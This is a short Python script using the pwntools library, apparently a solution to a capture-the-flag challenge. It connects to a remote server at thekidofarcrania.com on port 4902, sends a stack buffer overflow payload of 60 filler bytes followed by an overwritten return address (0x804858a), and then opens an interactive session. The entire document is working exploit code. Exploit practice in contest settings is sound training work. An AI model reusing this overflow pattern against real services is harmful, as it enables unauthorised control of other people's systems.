from pwn import *

#r = process('./server')
r = remote('thekidofarcrania.com', 4902)
payload = b'a' * 60

payload += p32(0x804858a)

r.sendline(payload)

r.interactive()
